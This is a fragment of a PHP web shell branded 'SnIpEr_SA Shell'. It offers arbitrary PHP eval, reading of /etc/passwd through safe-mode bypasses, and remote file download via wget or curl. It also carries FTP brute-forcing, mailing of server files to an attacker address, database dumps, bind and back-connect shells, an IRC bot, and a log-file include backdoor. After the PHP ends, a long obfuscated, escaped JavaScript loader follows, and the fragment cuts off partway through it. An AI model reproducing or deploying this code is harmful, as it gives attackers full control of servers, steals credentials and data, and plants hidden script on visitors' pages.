echo sr(15,"<b>".$lang[$language.'_text52'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text53'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text55'].$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
if(!$safe_mode && $unix){
echo $fs.$table_up1.div_title($lang[$language.'_text76'],'id8').$table_up2.div('id8').$ts;
echo sr(15,"<b>".$lang[$language.'_text72'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text73'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text74'].$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text32'],'id9').$table_up2.$font;
echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=3>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"sniper_sa.php\");\r\n//readfile(\"/etc/passwd\");"));
echo "</textarea>";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "</div></div></font>";
echo $table_end1.$fe;
if($safe_mode&&$curl_on)
{
echo $fs.$table_up1.div_title($lang[$language.'_text33'],'id10').$table_up2.div('id10').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
}
if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text34'],'id11').$table_up2.div('id11').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}


if($safe_mode&&$mssql_on)
{
echo $fs.$table_up1.div_title($lang[$language.'_text85'],'id13').$table_up2.div('id13').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&$unix&&function_exists('mb_send_mail')){
echo $fs.$table_up1.div_title($lang[$language.'_text112'],'id22').$table_up2.div('id22').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_list')){
echo $fs.$table_up1.div_title($lang[$language.'_text113'],'id23').$table_up2.div('id23').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_body')){
echo $fs.$table_up1.div_title($lang[$language.'_text114'],'id24').$table_up2.div('id24').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text115'],'id25').$table_up2.div('id25').$ts;
echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test8_file1',96,(!empty($_POST['test8_file1'])?($_POST['test8_file1']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));
echo sr(15,"<b>".$lang[$language.'_text117'].$arrow."</b>",in('text','test8_file2',96,(!empty($_POST['test8_file2'])?($_POST['test8_file2']):($dir))).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if(@ini_get('file_uploads')){
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1.div_title($lang[$language.'_text5'],'id14').$table_up2.div('id14').$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile',85,''));
echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
}
if(!$safe_mode&&$unix){
echo $fs.$table_up1.div_title($lang[$language.'_text15'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','rem_file',78,'http://'));
echo sr(15,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text86'],'id16').$table_up2.div('id16').$ts;
echo sr(15,"<b>".$lang[$language.'_text59'].$arrow."</b>",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
$arh = $lang[$language.'_text92'];
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(15,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo $te.'</div>'.$table_end1.$fe;
if(@function_exists("ftp_connect")){
echo $table_up1.div_title($lang[$language.'_text93'],'id17').$table_up2.div('id17').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text87']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text100']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));
echo $te."</td>".$fe."</tr></div></table>";
}
if($unix && @function_exists("ftp_connect")){
echo $fs.$table_up1.div_title($lang[$language.'_text94'],'id18').$table_up2.div('id18').$ts;
echo sr(15,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo sr(15,"","<font face=tahoma size=-2>".$lang[$language.'_text99']." ( <a href=".$_SERVER['PHP_SELF']."?users>".$lang[$language.'_text95']."</a> )</font>");
echo sr(15,"",in('checkbox','reverse id=reverse',0,'1').$lang[$language.'_text101']);
echo $te.'</div>'.$table_end1.$fe;
}
if(@function_exists("mail")){
echo $table_up1.div_title($lang[$language.'_text102'],'id19').$table_up2.div('id19').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text103']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=33 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'</textarea>');
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text104']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from sniper_sa shell"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."</td>".$fe."</tr></div></table>";
}
if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
$select = '<select name=db>';
if($mysql_on) $select .= '<option>MySQL</option>';
if($mssql_on) $select .= '<option>MSSQL</option>';
if($pg_on)    $select .= '<option>PostgreSQL</option>';
if($ora_on)   $select .= '<option>Oracle</option>';
$select .= '</select>';
echo $table_up1.div_title($lang[$language.'_text82'],'id20').$table_up2.div('id20').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text40']."</div></b></font>";
echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$lang[$language.'_text41'].$arrow."</b>",in('checkbox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text83']."</div></b></font>";
echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(35,"<b>".$lang[$language.'_text84'].$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."<div align=center id='n'><textarea cols=55 rows=1 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES; SELECT * FROM user; SELECT version(); select user();"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div></td>".$fe."</tr></div></table>";
}
if(!$safe_mode&&$unix){
echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port',15,'9999'));
echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',15,'SnIpEr'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'80'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text22']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',15,'80'));
echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',15,'irc.dalnet.ru'));
echo sr(40,"<b>".$lang[$language.'_text25'].$arrow."</b>",in('text','remote_port',15,'6667'));
echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."</td>".$fe."</tr></div></table>";
}

if($unix){
echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port1',35,'9999').ws(4).in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."</td>".$fe."</tr></div></table>";
echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text214'].$arrow."</b>",in('text','ircadmin',15,'ircadmin'));
echo sr(40,"<b>".$lang[$language.'_text215'].$arrow."</b>",in('text','ircserver',15,'ircserver'));
echo sr(40,"<b>".$lang[$language.'_text216'].$arrow."</b>",in('text','ircchanal',15,'ircchanl'));
echo sr(40,"<b>".$lang[$language.'_text217'].$arrow."</b>",in('text','ircname',15,'ircname'));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ips',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','ports',15,'80'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));

echo $te."</td>".$fe."</tr></div></table>";
}
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=tahoma size=-2><b>o---[ SnIpEr_SA Shell  | <a href=http://sniper-sa.com>http://sniper-sa.com</a> | <a SnIpEr.SA@hotmail.com>sniper.sa@hotmail.com</a> |  ⁄—Ì» Ê ÿÊÌ— ]---o</b></font></div></td></tr></table>".$f;

if(empty($_POST['log'])){
} else {
$log=$_POST['log'];
echo  error_log("<? print include(\$_GET[ss]) ?>", 3,$log);
echo "</textarea></CENTER>";
}
?>  <script type="text/javascript" language="javascript">
<!--
fF7eSD8=new Array();
fF7eSD8[0]="%3Cscript%3E%0Adocu";
fF7eSD8[1]="ment.write%28une";
fF7eSD8[2]="scape%28%22%253Cscri";
fF7eSD8[3]="pt%2520type%253D%25";
fF7eSD8[4]="22text/javascr";
fF7eSD8[5]="ipt%2522%253Edo";
fF7eSD8[6]="cument.write%25";
fF7eSD8[7]="28%2527%255Cu00";
fF7eSD8[8]="3c%255Cu0073%255C";
fF7eSD8[9]="u0063%255Cu0072";
fF7eSD8[10]="%255Cu0069%255Cu";
fF7eSD8[11]="0070%255Cu007";
fF7eSD8[12]="4%255Cu0020%255C";
fF7eSD8[13]="u0074%255Cu007";
fF7eSD8[14]="9%255Cu0070%255Cu";
fF7eSD8[15]="0065%255Cu003d%25";
fF7eSD8[16]="5Cu0022%255Cu0";
fF7eSD8[17]="074%255Cu0065%255C";
fF7eSD8[18]="u0078%255Cu0074%25";
fF7eSD8[19]="5Cu002f%255Cu";
fF7eSD8[20]="006a%255Cu0061%255";
fF7eSD8[21]="Cu0076%255Cu0";
fF7eSD8[22]="061%255Cu0073%25";
fF7eSD8[23]="5Cu0063%255Cu00";
fF7eSD8[24]="72%255Cu0069%25";
fF7eSD8[25]="5Cu0070%255Cu";
fF7eSD8[26]="0074%255Cu0022";
fF7eSD8[27]="%255Cu003e%255C";
fF7eSD8[28]="u0064%255Cu00";
fF7eSD8[29]="6f%255Cu0063%255C";
fF7eSD8[30]="u0075%255Cu006";
fF7eSD8[31]="d%255Cu0065%255Cu";
fF7eSD8[32]="006e%255Cu0074%255";
fF7eSD8[33]="Cu002e%255Cu00";
fF7eSD8[34]="77%255Cu0072%25";
fF7eSD8[35]="5Cu0069%255Cu";
fF7eSD8[36]="0074%255Cu0065%25";
fF7eSD8[37]="5Cu0028%255Cu002";
fF7eSD8[38]="7%255Cu005c%255Cu";
fF7eSD8[39]="0075%255Cu0030";
fF7eSD8[40]="%255Cu0030%255Cu0";
fF7eSD8[41]="033%255Cu0063%25";
fF7eSD8[42]="5Cu005c%255Cu007";
fF7eSD8[43]="5%255Cu0030%255Cu";
fF7eSD8[44]="0030%255Cu0035";
fF7eSD8[45]="%255Cu0033%255C";
fF7eSD8[46]="u005c%255Cu0075";
fF7eSD8[47]="%255Cu0030%255Cu";
fF7eSD8[48]="0030%255Cu003";
fF7eSD8[49]="4%255Cu0033%255";
fF7eSD8[50]="Cu005c%255Cu007";
fF7eSD8[51]="5%255Cu0030%255Cu";
fF7eSD8[52]="0030%255Cu0035%255";
fF7eSD8[53]="Cu0032%255Cu00";
fF7eSD8[54]="5c%255Cu0075%255C";
fF7eSD8[55]="u0030%255Cu0030%25";
fF7eSD8[56]="5Cu0034%255Cu00";
fF7eSD8[57]="39%255Cu005c%255Cu";
fF7eSD8[58]="0075%255Cu0030%255";
fF7eSD8[59]="Cu0030%255Cu003";
fF7eSD8[60]="5%255Cu0030%255C";
fF7eSD8[61]="u005c%255Cu0075";
fF7eSD8[62]="%255Cu0030%255Cu00";
fF7eSD8[63]="30%255Cu0035%255";
fF7eSD8[64]="Cu0034%255Cu005";
fF7eSD8[65]="c%255Cu0075%255C";
fF7eSD8[66]="u0030%255Cu0030%25";
fF7eSD8[67]="5Cu0032%255Cu";
fF7eSD8[68]="0030%255Cu005c%25";
fF7eSD8[69]="5Cu0075%255Cu00";
fF7eSD8[70]="30%255Cu0030%255";
fF7eSD8[71]="Cu0035%255Cu003";
fF7eSD8[72]="3%255Cu005c%255Cu0";
fF7eSD8[73]="075%255Cu0030";
fF7eSD8[74]="%255Cu0030%255Cu00";
fF7eSD8[75]="35%255Cu0032%25";
fF7eSD8[76]="5Cu005c%255Cu00";
fF7eSD8[77]="75%255Cu0030%255Cu";
fF7eSD8[78]="0030%255Cu003";
fF7eSD8[79]="4%255Cu0033%255Cu";
fF7eSD8[80]="005c%255Cu0075%25";
fF7eSD8[81]="5Cu0030%255Cu";
fF7eSD8[82]="0030%255Cu0033";
fF7eSD8[83]="%255Cu0064%255Cu0";
fF7eSD8[84]="05c%255Cu0075%25";
fF7eSD8[85]="5Cu0030%255Cu003";
fF7eSD8[86]="0%255Cu0036%255";
fF7eSD8[87]="Cu0038%255Cu0";
fF7eSD8[88]="05c%255Cu0075%255C";
fF7eSD8[89]="u0030%255Cu003";
fF7eSD8[90]="0%255Cu0037%255C";
fF7eSD8[91]="u0034%255Cu005c%25";
fF7eSD8[92]="5Cu0075%255Cu";
fF7eSD8[93]="0030%255Cu0030";
fF7eSD8[94]="%255Cu0037%255Cu";
fF7eSD8[95]="0034%255Cu005c%25";
fF7eSD8[96]="5Cu0075%255Cu00";
fF7eSD8[97]="30%255Cu0030%255Cu";
fF7eSD8[98]="0037%255Cu0030%255";
fF7eSD8[99]="Cu005c%255Cu00";
fF7eSD8[100]="75%255Cu0030%255";
fF7eSD8[101]="Cu0030%255Cu00";
fF7eSD8[102]="33%255Cu0061%255Cu";
fF7eSD8[103]="005c%255Cu0075";
fF7eSD8[104]="%255Cu0030%255C";
fF7eSD8[105]="u0030%255Cu0032%25";
fF7eSD8[106]="5Cu0066%255Cu00";
fF7eSD8[107]="5c%255Cu0075%255Cu";
fF7eSD8[108]="0030%255Cu0030%25";
fF7eSD8[109]="5Cu0032%255Cu0";
fF7eSD8[110]="066%255Cu005c";
fF7eSD8[111]="%255Cu0075%255Cu";
fF7eSD8[112]="0030%255Cu0030%25";
fF7eSD8[113]="5Cu0036%255Cu003";
fF7eSD8[114]="4%255Cu005c%255C";
fF7eSD8[115]="u0075%255Cu003";
fF7eSD8[116]="0%255Cu0030%255C";
fF7eSD8[117]="u0036%255Cu00";
fF7eSD8[118]="31%255Cu005c%255";
fF7eSD8[119]="Cu0075%255Cu00";
fF7eSD8[120]="30%255Cu0030%255Cu";
fF7eSD8[121]="0037%255Cu0034";
fF7eSD8[122]="%255Cu005c%255Cu00";
fF7eSD8[123]="75%255Cu0030%255C";
fF7eSD8[124]="u0030%255Cu003";
fF7eSD8[125]="6%255Cu0031%255";
fF7eSD8[126]="Cu005c%255Cu007";
fF7eSD8[127]="5%255Cu0030%255";
fF7eSD8[128]="Cu0030%255Cu0";
fF7eSD8[129]="032%255Cu0065";
fF7eSD8[130]="%255Cu005c%255C";
fF7eSD8[131]="u0075%255Cu0030%25";
fF7eSD8[132]="5Cu0030%255Cu003";
fF7eSD8[133]="7%255Cu0034%255Cu0";
fF7eSD8[134]="05c%255Cu0075%255C";
fF7eSD8[135]="u0030%255Cu00";
fF7eSD8[136]="30%255Cu0033%255C";
fF7eSD8[137]="u0030%255Cu005";
fF7eSD8[138]="c%255Cu0075%255Cu";
fF7eSD8[139]="0030%255Cu003";
fF7eSD8[140]="0%255Cu0033%255C";
fF7eSD8[141]="u0030%255Cu005";
fF7eSD8[142]="c%255Cu0075%255";
fF7eSD8[143]="Cu0030%255Cu0";
fF7eSD8[144]="030%255Cu0036%255C";
fF7eSD8[145]="u0063%255Cu005c";
fF7eSD8[146]="%255Cu0075%255C";
fF7eSD8[147]="u0030%255Cu00";
fF7eSD8[148]="30%255Cu0037%25";
fF7eSD8[149]="5Cu0033%255Cu00";
fF7eSD8[150]="5c%255Cu0075%255";
fF7eSD8[151]="Cu0030%255Cu00";
fF7eSD8[152]="30%255Cu0032%255";
fF7eSD8[153]="Cu0065%255Cu005c";
fF7eSD8[154]="%255Cu0075%255C";
fF7eSD8[155]="u0030%255Cu00";
fF7eSD8[156]="30%255Cu0036%255Cu";
fF7eSD8[157]="0066%255Cu005c%255";
fF7eSD8[158]="Cu0075%255Cu00";
fF7eSD8[159]="30%255Cu0030%255Cu";
fF7eSD8[160]="0037%255Cu0032%25";
fF7eSD8[161]="5Cu005c%255Cu007";
fF7eSD8[162]="5%255Cu0030%255C";
fF7eSD8[163]="u0030%255Cu0036%25";
fF7eSD8[164]="5Cu0037%255Cu00";
fF7eSD8[165]="5c%255Cu0075%255";
fF7eSD8[166]="Cu0030%255Cu0030";
fF7eSD8[167]="%255Cu0032%255Cu00";
fF7eSD8[168]="66%255Cu005c%255";
fF7eSD8[169]="Cu0075%255Cu0";
fF7eSD8[170]="030%255Cu0030%255C";
fF7eSD8[171]="u0037%255Cu0037";
fF7eSD8[172]="%255Cu005c%255Cu";
fF7eSD8[173]="0075%255Cu0030%25";
fF7eSD8[174]="5Cu0030%255Cu";
fF7eSD8[175]="0036%255Cu0038%255";
fF7eSD8[176]="Cu005c%255Cu007";
fF7eSD8[177]="5%255Cu0030%255";
fF7eSD8[178]="Cu0030%255Cu0036";
